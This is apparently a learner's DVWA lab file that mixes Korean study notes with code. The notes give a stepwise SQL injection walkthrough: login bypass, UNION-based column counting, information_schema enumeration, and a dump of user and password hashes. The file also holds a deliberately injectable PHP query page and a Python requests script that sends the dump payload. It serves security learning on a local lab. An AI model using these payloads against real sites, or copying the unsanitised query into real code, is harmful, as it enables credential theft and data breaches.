<!--
참조
https://webhack.dynu.net/?idx=20161224.001&print=friendly
https://haruhiism.tistory.com/131?category=832125
https://security04.tistory.com/171?category=619962



먼저 딱봐도 db를 거쳐야하는 입력폼에다가 ' 를 입력했을때 오류창이 나오면 sql문을 거칠 확률이 매우 높다.
공격의 타겟이 된다.
sql문이 조작되기 떄문

sql문을 공부 할 것
방어가 안되서 db명령어를 넣으면 뚫리는 수준 union 명령어를 공부하면 누구나 할 수 있다.
데이터배이스를 들어야한다.

//주석처리 공격
mysql 에서는 # 또는 다른 db에서 -- 가 주석이다
쿼리문이 깨져서 공격이 안되는 상황을 막을 수 있다.

// WHERE 구문 우회
1 or '1'='1
(원리)----------------------------------------------------------------------------------------------------------
왜 이걸 집어 넣으면 뚫리는 걸까???
원리는 간단하다.

SELECT user FROM user_table WHERE id='세피로트' AND password=' ';

이 구문에서 패쓰워드를 모른다고 가정해보자.
그래도 로그인 할 수 있다. 왜냐면 기존의 패쓰워드가 해시값으로 바뀌었을때 db의 저장된 값과 같으면
true 처리되어서 로그인되는 것이 로그인의 원리이다. 즉 패쓰워드가 필요한 것을 결국 true 처리를 하기 위한 것
그렇다면 1' or '1'='1 이걸 집어넣은 문장을 보자

password='1' or '1'='1'

패쓰워드가 1 이거나 1=1 이라면???
or 연산은 둘중 하나만 true 면 true 처리를 해준다.
1=1 이다. 이게 거짓인가??? 당연히 1은 1이니까 ture처리 되고 설령 패쓰워드가 1이 아니기 때문에 false 처리 되었다고 해도
or 연산이므로 둘 중 하나만 true 처리되면 true 이니 로그인 시켜버리는 것이다
그럼 여기서 이 원리로
or '1'='1' 로 인헤서 모든 아이디가 다 나온 걸까???

구문을 보자
SELECT first_name, last_name FROM users WHERE user_id = '$id';
여기서
SELECT first_name, last_name FROM users WHERE user_id = '$1' or '1'='1';
가 되었다.
user_id 가 참이라는 조건이므로 db의 모든 레코드가 조건에 해당되어 전부 나온 것이다.
----------------------------------------------------------------------------------------------------------



// UNION을 이용한 칼럼 갯수 알아내기
현재의 쿼리문에서 변개의 칼럼을 이용하고 있는지 알아내는 방법
1' union select 1,1#
(원리)-----------------------------------------------------------------------------------------------------
참조
https://1-day-1-coding.tistory.com/16
union은 두개의 쿼리문의 겹치는 것을 제거하여 보여주는 것을 말한다.
여기서 겹친다라는 점을 이용한다 쿼리문이 몇개의 칼럼을 이용하는지는 모르지만
겹치는것을 검사하려면 동일한 갯수의 칼럼을 가진 쿼리문만이 union에서 작동 될 것이다
>> select 문1 union select 문2  여기서 select 문1의 칼럼 갯수와 select 문2의 칼럼 갯수가 같아야 한다

SELECT first_name, last_name FROM users WHERE user_id = '$id';

이 쿼리문이
SELECT first_name, last_name FROM users WHERE user_id = '1' union select 1,1#';
됨으로써 first_name, last_name 두개와 select 1,1 두개 여기서 1과1 은 칼럼에는 없겠지만 겹치는것을 제거하여 보여줄뿐 없는 칼럼이라고
문제가 되진 않는다.
또 뒤에 주석처리를 하면서 문법적인 오류를 모두 생략
따라서 최종적으로
SELECT first_name, last_name FROM users WHERE user_id = '1' union select 1,1#';
를 실행시
SELECT first_name, last_name FROM users WHERE user_id = '1'
의 결과가 아무 오류 없이 나왔다면 지금 입력을 받는 폼값의 쿼리문이 두 개의 칼럼을 갖는다는 것을 의미한다.

칼럼 갯수 알아내서 뭐하게...? 하겠지만
이는 아래 나올 공격들의 엄청난 활용의 기반을 보여준다
요점은 겹치는 것들을 제거해서 보여준다는 건
겹칠게 없게 쿼리문을 짜놓으면 그 관련값이 다 나온다는 뜻이다.
역을 활용하는 것이다.
----------------------------------------------------------------------------------------------------------


// ORDER BY 구문을 이용한 칼럼 갯수 알아내기
현재의 쿼리문에서 변개의 칼럼을 이용하고 있는지 알아내는 방법
1' order by 2#
(원리)-----------------------------------------------------------------------------------------------------
쿼리문의 칼럼보다 많은 갯수의 칼럼은 정렬할수 없다는 점을 이용
----------------------------------------------------------------------------------------------------------


// 데이터베이스 명 조회
1' union select schema_name,1 from information_schema.schemata #
//여기서 알아낸 db로 테이블에 조회할 수 있다
(원리)-----------------------------------------------------------------------------------------------------
참조
https://dorahee.tistory.com/122
union 과 sql 문법의 활용 공격이다. schema_name, 1 from information_schema.schemata  단어들이 낯설을 텐데 별거 없다
mysql 에서는 information_schema 라는 데이터베이스에서 db의 데이터베이스 정보나 테이블 칼럼 정보등을 관리한다
데이터베이스.테이블명을 하면 해당 데이터베이스 안의 특정 테이블을 가져 올 수 있는데
information_schema.schemata는   ...(information_schema.schemata.PNG 참조)... 로 이루어져있다

하나씩 뜯어보자
1' union select schema_name,1 from information_schema.schemata #
이란 information_schema.schemata 안의 칼럼 schema_name 과 information_schema.schemata 안의 칼럼 1을 의미한다
여기서 1이라는 칼럼은 없는데 라고 생각할 수 있다. 그러나 union은 겹치는 것만 제외해줄 뿐 없어도 문제없다.
즉 1을 넣은 이유는 union의 갯수를 맟추기 위해서 문법적인 오류를 없애기 위해 주석처리함으로써
완성된 문장
SELECT first_name, last_name FROM users WHERE user_id = '1' union select schema_name,1 from information_schema.schemata #';
은 user_id = '1'인 first_name, last_name 의 호출과 db의 정보(information_schema.schemata.PNG 참조)를 담고있는 information_schema.schemata 안에
schema_name 칼럼과 1 칼럼의 겹치는 것을 제외하고 전부 출력하라는 뜻이 된다.
결과적으로 데이터베이스 명이 조회된다
----------------------------------------------------------------------------------------------------------



// dvwa 데이터베이스의 테이블 명 조회
1' union select table_schema, table_name from information_schema.tables where table_schema = 'dvwa' #
테이블까지 알아낸 다면 그 안에 칼럼을 조회랗 수 있다
(원리)-----------------------------------------------------------------------------------------------------
위의 동일한 원리 더하기 조건문 where table_schema = 'dvwa' 을 추가한 것인데 (딱봐도 dvwa와 관련있을 db같기 때문에)
information_schema.tables 데이터베이스의 모든 테이블의 정보가 여기있다.(information_schema.table.PNG 참조)
information_schema 데이터베이스의 table_schema = 'dvwa'인 table 이라는 테이블에서
table_schema의 값 과 table_name의 값 의
겹치는 것(이 경우 dvwa)을 제외하고 모두 출력하라는 뜻
결론적으로 dvwa 데이터베이스의 테이블 명 조회된다
----------------------------------------------------------------------------------------------------------




// users 테이블 칼럼 조회
1' union select table_name, column_name from information_schema.columns where table_schema = 'dvwa' and table_name = 'users'#
칼럼을 알았으니 아이디와 비밀번호를 탈취할 수 있다
(원리)-----------------------------------------------------------------------------------------------------
table_schema = 'dvwa' and table_name = 'users' 인 information_schema 라는 데이터베이스에 columns 테이블에
table_name, column_name 를 호출하라
dvwa 데이터베이스의  users 테이블 칼럼 조회
----------------------------------------------------------------------------------------------------------




//아이디, 비밀번호 탈취
5' UNION SELECT user,password FROM dvwa.users#
(원리)-----------------------------------------------------------------------------------------------------
dvwa라는 데이터베이스에 users 라는 테이블의 user,password 칼럼 값을 출력
----------------------------------------------------------------------------------------------------------


----------------------------------------------------------------------------------------------------
일부 웹 어플리케이션에서는 결과 1개만을 출력하는 경우가 있다. DVWA SQL Injection 문제가
결과 1개만을 출력한다고 가정하자. 이러한 경우에는 LIMIT 연산자를 이용하여
 1개씩 데이타를 유출하여야 한다. Medium level에서
dvwa.users 테이블의 user,password 유출은
다음과 같이 5번의 과정을 더 거쳐야 할 것이다.

   1 OR 1=1 UNION SELECT user,password FROM dvwa.users LIMIT 2,1#
   1 OR 1=1 UNION SELECT user,password FROM dvwa.users LIMIT 3,1#
   1 OR 1=1 UNION SELECT user,password FROM dvwa.users LIMIT 4,1#
   1 OR 1=1 UNION SELECT user,password FROM dvwa.users LIMIT 5,1#
   1 OR 1=1 UNION SELECT user,password FROM dvwa.users LIMIT 6,1#
----------------------------------------------------------------------------------------------------



sql injection 공격

1.sql문을 거칠 것 같은 폼에 ' 을 입력한다.
You have an error in your SQL syntax; check the manual......
이런 오류가 났다면 이건 말도 안되게 취약한 웹이다.
입력한 값이 바로 sql문으로 입력되는 구조로 '변수'으로 이루어져 있을 것이다.
이 경우 # 또는 -- 주석을 이용하여 뒤의 쿼리문을 생략함으로써
아이디만 알아도 로그인이 가능하다.
admin'#


-->

<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <?php
    include "C:\\xampp\\htdocs\\3.dvwa\\0.db_info.php";

    if( isset( $_REQUEST[ 'Submit' ] ) ) {
        // Get input
        $id = $_REQUEST[ 'id' ];

        // Check database
        $query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";
//          '' 이 안에 입력값이 들어오는 것을 매우 위험하다.
//          sql문을 바로 조작할 수 있기 때문이다


        $result = mysqli_query($con,  $query ) or die( '<pre>' . ((is_object($con)) ? mysqli_error($con) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );
        // Get results
    while( $row = mysqli_fetch_assoc( $result ) )  {
            //현재 $result안에 들어있는 레코드의 갯수를 의미한다
            // 즉 하나라도 등록 되어있으면 있는지 물어보는 것이다
            // Get values
            $first = $row["first_name"];
            $last  = $row["last_name"];
            // Feedback for end user
          echo "<pre>ID: {$id}<br />First name: {$first}<br />Surname: {$last}</pre>";
            // html문법과 같이 쓸때 php를 섞을때 {} 를 사용한다
    }

        mysqli_close($con);
    }

    ?>

</head>
<body>

<div id="system_info">
    <form action="#" method="GET">
        <p>
            User ID:
            <input type="text" size="15" name="id">
            <input type="submit" name="Submit" value="Submit">
        </p>

    </form>

</div>





</body>
</html>


<!--
#.py
from selenium import webdriver
from webdriver_manager.chrome import ChromeDriverManager
from selenium.webdriver.common.alert import Alert
import urllib
import urllib.parse
import urllib.request
import requests
driver = webdriver.Chrome(ChromeDriverManager().install())

driver.get('http://localhost/4.DVWA%EC%B5%9C%EC%8B%A0%EB%B2%84%EC%A0%84%EC%9B%90%EB%B3%B8/vulnerabilities/sqli/')


url = "http://localhost/4.DVWA%EC%B5%9C%EC%8B%A0%EB%B2%84%EC%A0%84%EC%9B%90%EB%B3%B8/vulnerabilities/sqli/"
cookies={"PHPSESSID":"dal87983ub7tto8robtbrdhcn1" ,"security":"low"}
payload = {"id":"5' UNION SELECT user,password FROM dvwa.users#", "Submit":"Submit"}
res = requests.get(url,payload, cookies=cookies)
print(res)
print(res.text)
-->





